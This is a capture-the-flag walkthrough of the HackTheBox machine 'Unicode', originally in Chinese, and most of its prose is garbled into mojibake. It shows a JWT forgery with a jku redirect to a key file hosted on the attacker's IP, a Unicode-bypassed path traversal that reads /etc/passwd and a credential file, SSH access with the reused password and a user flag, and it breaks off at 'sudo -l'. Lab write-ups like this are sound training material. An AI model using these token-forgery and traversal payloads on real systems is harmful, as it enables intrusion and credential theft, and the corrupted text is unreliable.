# Êù•Ëá™ HackTheBox ÁöÑ Unicode ËØ¶ÁªÜÊºîÁªÉ

> ÂéüÊñáÔºö<https://infosecwriteups.com/unicode-from-hackthebox-detailed-walkthrough-5da3481816de?source=collection_archive---------0----------------------->

## Â±ïÁ§∫ÂÆåÊàêÁõíÂ≠êÊâÄÈúÄÁöÑÊâÄÊúâÂ∑•ÂÖ∑ÂíåÊäÄÊúØ„ÄÇ

# Êú∫Âô®‰ø°ÊÅØ

![](img/1af9e485203c27bb9a4dbb803d624b8f.png)

Êù•Ëá™ HackTheBox ÁöÑ Unicode

Unicode ÊòØ HackTheBox ‰∏äÁöÑ‰∏≠ÂûãÊú∫Âô®„ÄÇÊàë‰ª¨ÊúÄÂàùÁöÑÊâ´ÊèèÊâæÂà∞‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÁΩëÁ´ôËøõË°åÁ†îÁ©∂Ôºå‰ªéÈÇ£ÈáåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÊúâË∂£ÁöÑ JSON Web ‰ª§ÁâåÁöÑ‰ΩøÁî®„ÄÇ‰ΩøÁî® JWT Â∑•ÂÖ∑ÔºåÊàë‰ª¨Ëß£Á†ÅÔºåÁÑ∂ÂêéÂà∂‰ΩúËá™Â∑±ÁöÑ‰ª§ÁâåÔºå‰ª•Ëé∑ÂæóÂØπ‰ª™Ë°®ÊùøÁöÑÁÆ°ÁêÜÂëòËÆøÈóÆÊùÉÈôê„ÄÇÂú®ËøôÈáåÔºåÊàë‰ª¨‰ΩøÁî® unicode ËøáÊª§Âô®ÊóÅË∑ØÈÄöËøáÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÊ≥ÑÊºèÊï∞ÊçÆÔºåÂØºËá¥ÈÄöËøá SSH ËÆøÈóÆÊú∫Âô®„ÄÇÂçáÁ∫ßÂà∞ root ‰ΩøÁî®‰∫Ü‰∏Ä‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÔºåÊàë‰ª¨ÂèëÁé∞ËØ•Êñá‰ª∂Áî±‰∫éËØØÁî® curl ÂèÇÊï∞ËÄåÊòìÂèóÊîªÂáª„ÄÇ

ÊâÄÈúÄÊäÄËÉΩÊòØÂØπ JSON Web ‰ª§ÁâåÁöÑÂü∫Êú¨ÁêÜËß£„ÄÇÂ≠¶Âà∞ÁöÑÊäÄËÉΩÊòØ‰ΩøÁî® JWT Â∑•ÂÖ∑ÊìçÁ∫µÔºåÁÑ∂ÂêéÂàõÂª∫ÊÅ∂ÊÑè‰ª§Áâå„ÄÇ

[](https://www.hackthebox.com/home/machines/profile/415) [## Unicode ‚ÄîÁ†¥Ëß£ÁõíÂ≠ê::Ê∏óÈÄèÊµãËØïÂÆûÈ™åÂÆ§

### ÁôªÂΩï Hack The Box Âπ≥Âè∞ÔºåËÆ©ÊÇ®ÁöÑÁ¨îÊµãËØïÂíåÁΩëÁªúÂÆâÂÖ®ÊäÄËÉΩÊõ¥‰∏ä‰∏ÄÂ±ÇÊ•ºÔºÅ

www.hackthebox.com](https://www.hackthebox.com/home/machines/profile/415) 

# ÂàùÊ≠•‰æ¶ÂØü

ÂÉèÂæÄÂ∏∏‰∏ÄÊ†∑ÔºåËÆ©Êàë‰ª¨‰ªé Nmap ÂºÄÂßã:

![](img/10fdeecb69c3bdb29fd15e5e4ba205a6.png)

ÁõíÂ≠êÁöÑ Nmap Êâ´Êèè

Âè™Êúâ‰∏§‰∏™ÂºÄÊîæÁöÑÁ´ØÂè£„ÄÇ‰∏çÁü•ÈÅì‰∏ªÊú∫ÂêçÔºåÊâÄ‰ª•ÂÖàËØïËØï IP:

![](img/8e388961f4c3f66576848a0b9c942179.png)

ÈªëÂÆ¢Â™í‰ΩìÁΩëÁ´ô

ËøôÈáå‰ªÄ‰πàÈÉΩÊ≤°ÊúâÔºåÂè™ÊòØ‰∏Ä‰∏™ÈùôÊÄÅÁ´ôÁÇπ„ÄÇÊúâË∂£ÁöÑÊòØÔºå‰∏≠Èó¥Êúâ‰∏Ä‰∏™Â§ßÊåâÈíÆÔºå‰∏äÈù¢ÂÜôÁùÄ‚ÄúÂÖ≥‰∫éÊàë‰ª¨ÁöÑË∞∑Ê≠å‚Äù„ÄÇÊü•Áúã URLÔºåÊàë‰ª¨ÁúãÂà∞‰∏Ä‰∏™Âêç‰∏∫‚ÄúÈáçÂÆöÂêë‚ÄùÁöÑÂ≠êÈ°µÈù¢:

```
http://10.10.11.126/redirect/?url=google.com
```

# ÂàõÈÄ†Áî®Êà∑

Ê≤°‰ªÄ‰πàÂèØÁúãÁöÑÔºåËÆ©Êàë‰ª¨ËØïÁùÄÊ≥®ÂÜå‰∏Ä‰∏™Â∏êÊà∑:

![](img/864a2e1717eb3fd36b3e5408399573c9.png)

Ê≥®ÂÜåË°®Âçï

ÊàëËØïÂõæÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ admin ÁöÑÂ∏êÊà∑Ôºå‰ΩÜÊàë‰ª¨ÁúãÂà∞ÂÆÉÂ∑≤ÁªèÂ≠òÂú®„ÄÇËøôÂú®ÂêéÈù¢‰ºöÂæàÊúâË∂£ÔºåËÆ©Êàë‰ª¨ÂàõÂª∫‰∏Ä‰∫õÂà´ÁöÑ‰∏úË•ø:

![](img/457787b33d695dc4a1786a411f3a731f.png)

Ê≥®ÂÜåÊñ∞Áî®Êà∑

‰Ωú‰∏∫Êàë‰ª¨ÁöÑÊñ∞Áî®Êà∑ÁôªÂΩïÂêéÔºåÊàë‰ª¨Âú®ËøôÈáåÁªìÊùü:

![](img/eff61112427e72b71a287a26586347f4.png)

ÈªëÂÆ¢Â™í‰ΩìÁΩëÁ´ô‰∏äÁöÑ‰ª™Ë°®Êùø

# JSON Web ‰ª§Áâå

ÊúâÂá†È°µÂèØ‰ª•ÁúãÔºå‰ΩÜÊ≤°‰ªÄ‰πàÊòéÊòæÁöÑ„ÄÇËÆ©Êàë‰ª¨Áî® curl Êù•ÁúãÁúãÊ†áÈ¢ò:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# curl -i -s -k -X POST -d 'username=pencer&password=password' 'http://10.10.11.126/login/'
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 16 Dec 2021 21:19:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: keep-alive
Location: http://10.10.11.126/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw; Path=/
```

# JWT Â∑•ÂÖ∑

ËøîÂõûÁöÑ cookie ÂæàÂÆπÊòìË¢´ËØÜÂà´‰∏∫ JSON Web ‰ª§Áâå(JWT)„ÄÇËøô‰∏™ÂæàÂ•ΩÂú∞‰ªãÁªç‰∫ÜËøô‰∫õÊ¶ÇÂøµ„ÄÇÊàë‰ª¨Âú®Âè¶‰∏Ä‰∏™Âêç‰∏∫[ÁßòÂØÜ](https://pencer.io/ctf/ctf-htb-secret/)ÁöÑÁõíÂ≠êÈáå‰ªãÁªç‰∫Ü JWTÔºåÂú®ÈÇ£‰∏™ÁõíÂ≠êÈáåÔºåÊàë‰ΩøÁî®‰∫ÜËíÇÂç°Â∞îÁöÆÁöÑ [JWT Â∑•ÂÖ∑ÂåÖ](https://github.com/ticarpi/jwt_tool)„ÄÇËÆ©Êàë‰ª¨ÂÜçÊ¨°‰ΩøÁî®ÂÆÉÔºåÈ¶ñÂÖà‰∏ãËΩΩËÑöÊú¨:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode/test]
‚îî‚îÄ# wget https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
--2021-12-15 22:16:32--  https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133....
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99348 (97K) [text/plain]
Saving to: ‚Äòjwt_tool.py‚Äô
jwt_tool.py            100%[====================================>]  97.02K  --.-KB/s    in 0.03s   
2021-12-15 22:16:33 (3.33 MB/s) - ‚Äòjwt_tool.py‚Äô saved [99348/99348]
```

‰∏çÂ∏¶ÂèÇÊï∞ËøêË°åËÑöÊú¨‰∏ÄÊ¨°ÔºåÂàõÂª∫ÂàùÂßãÈÖçÁΩÆÂíåÊñá‰ª∂:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# python3 jwt_tool.py

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

No config file yet created.
Running config setup.
Configuration file built - review contents of "jwtconf.ini" to customise your options.
Make sure to set the "httplistener" value to a URL you can monitor to enable out-of-band checks.
```

Êàë‰ª¨Áé∞Âú®Â∑≤ÁªèÂàõÂª∫‰∫ÜÂÖ¨Èí•ÂíåÁßÅÈí•Ôºå‰ª•ÂèäÊàë‰ª¨Ëá™Â∑±ÁöÑ jwks.json Êñá‰ª∂:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# ll
total 232
-rw-r--r-- 1 root root  1879 Dec 15 22:13 jwtconf.ini
-rw-r--r-- 1 root root   507 Dec 15 22:13 jwttool_custom_jwks.json
-rw-r--r-- 1 root root   240 Dec 15 22:13 jwttool_custom_private_EC.pem
-rw-r--r-- 1 root root  1674 Dec 15 22:13 jwttool_custom_private_RSA.pem
-rw-r--r-- 1 root root   177 Dec 15 22:13 jwttool_custom_public_EC.pem
-rw-r--r-- 1 root root   450 Dec 15 22:13 jwttool_custom_public_RSA.pem
-rw-r--r-- 1 root root 99348 Dec 15 22:13 jwt_tool.py
```

# Ëß£Á†Å JWT

Ëøô‰∫õÂ∞ÜÂú®Êàë‰ª¨Âà∂ÈÄ† JWT ÊúâÊïàËΩΩËç∑Êó∂‰ΩøÁî®„ÄÇÊàë‰ª¨ÂèØ‰ª•Ëß£Á†ÅÊî∂Âà∞ÁöÑ cookie Êù•Ê£ÄÊü•ÂÜÖÂÆπ:

```
root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi
=====================
Token header values:
[+] typ = "JWT"
[+] alg = "RS256"
[+] jku = "http://hackmedia.htb/static/jwks.json"

Token payload values:
[+] user = "pencer"
----------------------
```

Êàë‰ª¨ÁúãÂà∞Êàë‰ª¨ÂàõÂª∫ÁöÑÁî®Êà∑ÔºåÊàë‰ª¨ËøòÁúãÂà∞‰∏Ä‰∏™‰∏∫ hackmedia.htb ÁöÑ‰∏ªÊú∫ÂêçËÆæÁΩÆÁöÑ JKU„ÄÇ[Ëøô‰∏™](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)Ê∂µÁõñ‰∫ÜÈªëÂÆ¢ JWT Âíå JKU ÁöÑÊ¶ÇÂøµÔºå‰ΩÜÂü∫Êú¨‰∏ä jwks.json Êñá‰ª∂ÊòØ‰∏ÄÁªÑ json ÁºñÁ†ÅÁöÑÂÖ¨Èí•ÔºåÁî®‰∫éÂØπÊàë‰ª¨‰Ωú‰∏∫ cookie Êé•Êî∂ÁöÑ JWT ËøõË°åÊï∞Â≠óÁ≠æÂêç„ÄÇ

ËÆ©Êàë‰ª¨Â∞Ü hackmedia Ê∑ªÂä†Âà∞Êàë‰ª¨ÁöÑ hosts Êñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéÁúãÁúã jwks.json Êñá‰ª∂:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode/test]
‚îî‚îÄ# echo "10.10.11.126 hackmedia.htb" >> /etc/hosts

‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# curl http://hackmedia.htb/static/jwks.json                                          
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-
            UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_
            DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

# È™åËØÅ JWT

Ëøô‰∏™ÂÖ¨ÂÖ±Êñá‰ª∂Áî®‰∫éÈ™åËØÅÊàë‰ª¨ÁöÑ JWTÔºåÊàë‰ª¨ÂèØ‰ª•Âú®Êú¨Âú∞ÊµãËØïÂÆÉ:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode/test]
‚îî‚îÄ# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw -V -jw jwks.json

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

JWKS Contents:
Number of keys: 1
--------                                                                                                                                                                                                                   Key 1
kid: hackthebox
[+] kty = RSA
[+] use = sig
[+] kid = hackthebox
[+] alg = RS256
[+] n = AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju
-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF
_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs                                                                                                                           
[+] e = AQAB

Found RSA key factors, generating a public key
[+] kid_hackthebox_1639691778.pem

Attempting to verify token using kid_hackthebox_1639691778.pem
RSA Signature is VALID
```

Ê≠§Êó∂ÔºåÊàë‰ª¨Â∑≤ÁªèËé∑Âæó‰∫ÜÈÄöËøá‰ΩøÁî®Êàë‰ª¨ÁöÑÁî®Êà∑Â∏êÊà∑ÁôªÂΩïÂàõÂª∫ÁöÑ cookieÔºåÊàë‰ª¨Â∑≤Áªè‰∏ãËΩΩ‰∫ÜÂÖ¨ÂÖ±ÁöÑ jwks.json Êñá‰ª∂ÔºåÂπ∂È™åËØÅ‰∫Ü RSA Á≠æÂêçÊòØÊúâÊïàÁöÑ„ÄÇ

Êàë‰ª¨Â∏åÊúõÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ‰ª§ÁâåÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂÆÉ‰Ωú‰∏∫ÁÆ°ÁêÜÂëòÁôªÂΩïÂà∞ hackmedia dashboardÔºåÂõ†‰∏∫Êàë‰ª¨‰πãÂâçÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ÁöÑÂ∏êÊà∑Â∑≤ÁªèÂ≠òÂú®„ÄÇÈ¶ñÂÖàÔºåËÆ©Êàë‰ª¨ÈáçÂëΩÂêçËá™ÂÆö‰πâÁöÑ jwks.json Êñá‰ª∂ÔºåÂπ∂ÂêØÂä®‰∏Ä‰∏™ web ÊúçÂä°Âô®ÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ËÆøÈóÆÂÆÉ‰∫Ü:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# mv jwttool_custom_jwks.json jwks.json 

‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode]
‚îî‚îÄ# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

# ÁØ°Êîπ JWT

Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Â∞ÜÁØ°Êîπ cookieÔºå‰ΩøÁî®Êà∑Êàê‰∏∫ÁÆ°ÁêÜÂëò„ÄÇÊàë‰ª¨ËøòÈúÄË¶ÅÈáçÂÆöÂêë JKU Ê£ÄÊü•Ôºå‰ª•‰æøÂÆÉ‰ΩøÁî®Áî±Êàë‰ª¨Âú® Kali ‰∏äÊâòÁÆ°ÁöÑ jwt Â∑•ÂÖ∑ÂàõÂª∫ÁöÑËá™ÂÆö‰πâÊ£ÄÊü•„ÄÇÁÑ∂ÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÂÜçÊ¨°ÂØπ‰ª§ÁâåËøõË°åÁ≠æÂêçÔºå‰ª•‰æøÁ≠æÂêçÊúâÊïà„ÄÇÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® jwt_tool ÂàõÂª∫ÁöÑÂØÜÈí•ÂØπÊù•ÂÅöÂà∞Ëøô‰∏ÄÁÇπ:

```
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/htb/unicode/test]
‚îî‚îÄ# root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw  -I -hc jku -hv http://hackmedia.htb/static/../redirect/?url=10.10.14.241/jwks.json -pc user -pv admin -S rs256 -pr jwttool_custom_private_RSA.pem

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

jwttool_2e549bdf823847e163cdb9fb301aed1a - Tampered token - RSA Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjI0MS9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.jRPqqWUrVKo4AHWZ6CbCmV-uQbtC9OB_4vIQkrOdB2SZhGXLcBmFMujcz5TkidarraSThjFjpXsNDtacW6h4q8lcFu6ePOqKFErh33dItW5LKEIQrAZTZ2oL6s8kEisYYEPKEfn3m_M0fYZZL4knj8_Hq70LDg0GhW9pJy4GZouMYKNf-ILY9IDavVpg6b-S2t6l0ALEya5AdHdbh3ChMeDduikaeaL_s_r7xPtguXFttYA37bqNgbeREZE8AifJhA9Q-jlMTay3OyjBFXT-diLHIvqGEwWnIkbXHX_lH97Eomv3hDhNJ-pv30FgGXRttwS_aOvth3sCre0fHUVqJQ
```

Â∞ÜËøô‰∫õÂèÇÊï∞ÂàÜËß£‰∏Ä‰∏ã:

![](img/2fc728a0c8d7151ef86a78e6ec7ad39e.png)

JWT Â∑•ÂÖ∑ÂèÇÊï∞

# Âú®ÊµèËßàÂô®‰∏≠ÊèíÂÖ• JWT

Êàë‰ª¨ÁúãÂà∞ËØ•Â∑•ÂÖ∑Áªô‰∫ÜÊàë‰ª¨‰∏Ä‰∏™Êñ∞ÁöÑ‰ª§ÁâåÔºåÂÆÉË¢´ÁØ°ÊîπÔºåÁÑ∂ÂêéË¢´Á≠æÂêç„ÄÇÂ§çÂà∂Âπ∂ËøîÂõûÂà∞Êàë‰ª¨ÁöÑ web ÊµèËßàÂô®ÔºåÊàë‰ª¨‰ªçÁÑ∂‰ª•Êàë‰ª¨ÂàõÂª∫ÁöÑÁî®Êà∑Ë∫´‰ªΩÁôªÂΩïÂà∞ hackmedia dashboard„ÄÇÈÄöËøáÊåâ Shift+F9 ÊàñËΩ¨Âà∞ Web DeveloperÔºåÁÑ∂ÂêéËΩ¨Âà∞Â≠òÂÇ®Ê£ÄÊü•Âô®ÔºåÊõøÊç¢Êàë‰ª¨ÊµèËßàÂô®‰∏≠ÁöÑ cookie:

![](img/9fd165d4f7b87e882dbd1cd26aae79c6.png)

Âú®ÊµèËßàÂô®‰∏≠ÊõøÊç¢ cookie

# ‰ª™Ë°®Áõò

Â∞ÜÊàë‰ª¨Êñ∞Âà∂‰ΩúÁöÑ‰ª§ÁâåÁ≤òË¥¥Âà∞ÂÄºÂ≠óÊÆµÂêéÔºåÊàë‰ª¨ÂèØ‰ª•Âà∑Êñ∞È°µÈù¢ÔºåÊàë‰ª¨Â∞ÜÁúãÂà∞Êàë‰ª¨Áé∞Âú®ÊòØÁÆ°ÁêÜÂëò:

![](img/acb09c02ef2256d3e43fc646e97d31ca.png)

ËøôÈáåÂîØ‰∏ÄÁöÑ‰∏úË•øÊòØ‰øùÂ≠òÊä•ÂëäÁöÑ‰∏§‰∏™ÈìæÊé•„ÄÇÁÇπÂáªÂÖ∂‰∏≠‰∏Ä‰∏™‰ºöÂ∞ÜÊàë‰ª¨Â∏¶Âà∞‰∏Ä‰∏™È°µÈù¢Ôºå‰∏äÈù¢ÂÜôÁùÄ:

```
The Report is being prepraed. Please comeback later.
```

Êü•ÁúãÁΩëÂùÄÔºåÊàë‰ª¨ÁúãÂà∞:

```
http://hackmedia.htb/display/?page=quarterly.pdf
```

‰∏Ä‰∏™ URL ÂèÇÊï∞ÔºåÂ¶ÇÊûúÊàë‰ª¨Â∞ùËØïËøôÊ†∑ÁØ°Êîπ:

```
http://hackmedia.htb/display/?page=../../../etc/passwd
```

Êàë‰ª¨Êî∂Âà∞‰∏ÄÊù° 404 Êñá‰ª∂Êú™ÊâæÂà∞ÈîôËØØÊ∂àÊÅØ:

```
we do a lot input filtering you can never bypass our filters. Have a good day
```

# Unicode Á≠õÈÄâÂô®ÊóÅË∑Ø

‰∏Ä‰∏™ÊåëÊàòÔºÅÁ∫øÁ¥¢Â∞±Âú®ÁõíÂ≠êÁöÑÂêçÂ≠óÈáåÔºå‰ΩøÁî®[Ëøô‰∏™](https://lazarv.com/posts/unicode-normalization-vulnerabilities/)ÊúâÁî®ÁöÑÊåáÂçóÊàë‰ª¨ÂèØ‰ª•ÁªïËøá‰ΩøÁî® unicode Á≠â‰ª∑ÁöÑËøáÊª§Âô®„ÄÇËøôÊòØÊàë‰ª¨ÊÑüÂÖ¥Ë∂£ÁöÑÈÉ®ÂàÜ:

![](img/ab70ddca595b45802e43a9b12d0a08ff.png)

Ë∑ØÂæÑÈÅçÂéÜÁ§∫‰æã

‰ΩøÁî®ÁúãËµ∑Êù•ÂÉèÂÜíÂè∑ÁöÑÂ≠óÁ¨¶ÔºåÊàë‰ª¨ÂèØ‰ª•Ëé∑Âèñ passwd Êñá‰ª∂:

![](img/125ab5d2fad3db9e7c3442055cc88afa.png)

‰ΩøÁî®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´Êù•ËØªÂèñÂØÜÁ†ÅÊñá‰ª∂

Âú®Âàó‰∏æ‰∫Ü‰∏Ä‰∫õ‰πãÂêéÔºåÊàëÊü•Áúã‰∫Ü nginx.conf Êñá‰ª∂:

![](img/efda1025243b2905bfb8316410502a55.png)

nginx.conf Êñá‰ª∂ÁöÑÂÜÖÂÆπ

Êàë‰ª¨ÁúãÂà∞ÊèêÂà∞‰∫ÜÊõ¥Â§öÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÂú®ÂêØÁî®‰∫ÜÊ®°ÂùóÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠ÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏Ä‰∫õÊúâË∂£ÁöÑ‰∏úË•ø:

![](img/a85f7c5eb23f40beb7920adf3a498349.png)

ÂêØÁî®Ê®°ÂùóÁöÑÊñá‰ª∂ÁöÑÂÜÖÂÆπ

Êúâ‰∏™ËØÑËÆ∫ËØ¥‰ªé db.yaml ÊîπÁî®Êà∑ÂØÜÁ†ÅÔºåÊàë‰ª¨‰πüÁúãÂà∞‰ΩçÁΩÆÊòØ/home/code/coder ‰Ωú‰∏∫Ê†π„ÄÇÂ¶ÇÊûúÊàë‰ª¨Êü•ÁúãËØ•Êñá‰ª∂ÔºåÊàë‰ª¨‰ºöÂæóÂà∞Âá≠ËØÅ:

![](img/2986ba13ddf191fe16e6edcb1a21a55a.png)

Âú® db.yaml Êñá‰ª∂‰∏≠ÊâæÂà∞ÁöÑÂá≠ÊçÆ

# SSH ËÆøÈóÆ

Êàë‰ª¨ÂèëÁé∞ SSH ‰πüÈáçÁî®‰∫ÜÂØÜÁ†Å:

```
root@kali:~/htb/unicode# ssh code@hackmedia.htb
code@hackmedia.htbs password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
code@code:~$
```

# Áî®Êà∑Ê†áÂøó

ËÆ©Êàë‰ª¨ÂÖàÊäì‰ΩèÁî®Êà∑Ê†áÂøó:

```
code@code:~$ cat user.txt 
fc82d29ddf1fdf62037b4e9443c03a31
```

ÂÉèÂæÄÂ∏∏‰∏ÄÊ†∑ÔºåÈ¶ñÂÖàË¶ÅÊ£ÄÊü•ÁöÑÊòØ sudo ÊùÉÈôê:

```
code@code:~$ sudo -l
